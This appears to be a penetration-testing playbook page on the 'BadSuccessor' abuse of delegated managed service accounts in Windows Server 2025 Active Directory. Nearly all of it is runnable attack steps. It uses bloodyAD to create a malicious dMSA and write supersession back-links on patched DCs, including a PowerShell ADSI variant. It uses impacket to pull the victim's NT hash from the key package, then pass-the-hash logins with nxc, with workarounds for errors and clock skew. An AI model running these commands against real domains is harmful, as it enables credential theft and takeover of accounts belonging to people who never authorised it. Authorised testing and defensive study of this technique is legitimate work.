# BadSuccessor — dMSA Migration Abuse (Server 2025)

## When this applies

- Domain has a **Windows Server 2025** DC (`msDS-DelegatedManagedServiceAccount` class exists).
- Your principal (or a foothold identity) has **`CreateChild`** for that class on **any OU** — i.e. can create a delegated MSA (dMSA).
- Goal: create a dMSA that "supersedes" a target account; the KDC then hands you the target's Kerberos keys (incl. its real **NT hash**) — no crack, no PKINIT, no password reset right needed.

Detect it without guessing:

```bash
nxc ldap <DC_FQDN> -u <user> -p '<pass>' -M badsuccessor
# Lists every principal that can create a dMSA and the OU it can create it in.
```

This is the go-to when a `GenericWrite`/control edge on a service account looks dead (RC4 disabled, PKINIT off, password random) — pair it with a `CreateChild`-on-OU edge.

## Patched vs unpatched DCs

- **Unpatched** (build < 26100.4946): a one-way link on the dMSA suffices. Use `--prepatch`.
- **Patched** (build ≥ 26100.4946): a one-way link returns `KRB_ERR_GENERIC`. You must ALSO write the **back-link on the target**:
  - `msDS-SupersededManagedAccountLink = <dMSA DN>`
  - `msDS-SupersededServiceAccountState = 2`
  - ⇒ on a patched DC you can only supersede a target you can **write** to. The intended primitive is `CreateChild`-on-OU **+** `GenericWrite`-on-a-victim (e.g. a backup/service account). Plain `GenericWrite` that yields nothing on its own becomes the enabler here.

## Steps (Linux)

```bash
# 1. Create the dMSA superseding the target. Any principal with CreateChild on the OU.
#    bloodyAD sets msDS-GroupMSAMembership = you so you can drive the key request.
bloodyAD --host <DC_FQDN> -d <domain> -u <user> -p '<pass>' \
  add badSuccessor evildmsa \
  --ou 'OU=<writableOU>,DC=<dc>,DC=<dc>' \
  -t 'CN=<TargetAccount>,...,DC=<dc>,DC=<dc>' --prepatch
#  bloodyAD's auto-S4U2self step often dies KDC_ERR_ETYPE_NOTSUPP when RC4 is
#  disabled (Server 2025 default). IGNORE it — the dMSA object is still created.
#  Verify: get search --filter '(objectClass=msDS-DelegatedManagedServiceAccount)'

# 2. PATCHED DC only: write the back-link on the target (needs write on the target).
#    If your write-on-target is GenericWrite held by a *different* identity than the
#    one with CreateChild (common — e.g. you have RCE as that identity), do it there.
#    From Linux as a principal with write on the target:
bloodyAD --host <DC_FQDN> -d <domain> -u <writer> -p '<pass>' \
  set object 'CN=<TargetAccount>,...' msDS-SupersededManagedAccountLink \
  -v 'CN=evildmsa,OU=<writableOU>,DC=<dc>,DC=<dc>'
bloodyAD --host <DC_FQDN> -d <domain> -u <writer> -p '<pass>' \
  set object 'CN=<TargetAccount>,...' msDS-SupersededServiceAccountState -v 2
#    Or, when the write is only usable in an RCE context, via PowerShell ADSI:
#      $d=[ADSI]"LDAP://CN=<TargetAccount>,..."
#      $d.Properties["msDS-SupersededManagedAccountLink"].Add("CN=evildmsa,...")|Out-Null
#      $d.Properties["msDS-SupersededServiceAccountState"].Value=2; $d.CommitChanges()

# 3. Request the dMSA key package (impacket — derives AES from password; RC4 often off).
getTGT.py '<domain>/<user>:<pass>' -dc-ip <DC_IP>     # add `faketime -f '+Nh'` if skewed
KRB5CCNAME=<user>.ccache getST.py -k -no-pass \
  -impersonate 'evildmsa$' -self -dmsa '<domain>/<user>' -dc-ip <DC_IP>
#  Prints KERB_DMSA_KEY_PACKAGE:
#    current-keys  = the dMSA's OWN keys (not useful for the victim)
#    previous-keys = the SUPERSEDED account's real keys → the RC4 entry IS its NT hash
```

## Using the recovered keys

The **`previous-keys` RC4 value is the target account's real NT hash.** Authenticate as the target directly (most reliable):

```bash
nxc smb   <DC_FQDN> -u <TargetAccount> -H <prev_rc4_nthash>
nxc winrm <DC_FQDN> -u <TargetAccount> -H <prev_rc4_nthash>
```

Then continue the chain from the target's privileges (group memberships, share access, delegation, etc.).

## Cleanup (reversible engagement hygiene)

```bash
bloodyAD ... remove object 'CN=evildmsa,OU=<writableOU>,...'        # link auto-clears
bloodyAD ... set object 'CN=<TargetAccount>,...' msDS-SupersededServiceAccountState -v 0
```

## Common pitfalls

- **`KDC_ERR_GENERIC`** after the link is set on an unpatched attempt → the DC is patched; set the target back-link (step 2). If you can't write the target, pick a target you *can* write.
- **`KDC_ERR_ETYPE_NOTSUPP`** from bloodyAD/kerbad → RC4 disabled; the object is still created. Finish the key request with impacket (AES).
- **Clock skew** → all Kerberos under `faketime -f '+Nh'`; point `krb5.conf` `kdc=` at the DC IP.
- A plain `getTGT` for the dMSA does **not** reliably inherit the victim's group memberships into the PAC — don't rely on the dMSA ticket; extract the victim NT hash from `previous-keys` and auth as the victim.

## Tools

- bloodyAD (`add badSuccessor`, `set object`)
- impacket `getST.py -dmsa`, `getTGT.py`
- nxc `-M badsuccessor`

## Related

- A target with backup/share access often leads to a VM/disk image → memory-image creds: [../windows-privesc/memory-dump-creds.md](../windows-privesc/memory-dump-creds.md).
- Other control-edge primitives: [acl-abuse-chains.md](acl-abuse-chains.md), [shadow-credentials.md](shadow-credentials.md), [gmsa.md](gmsa.md).
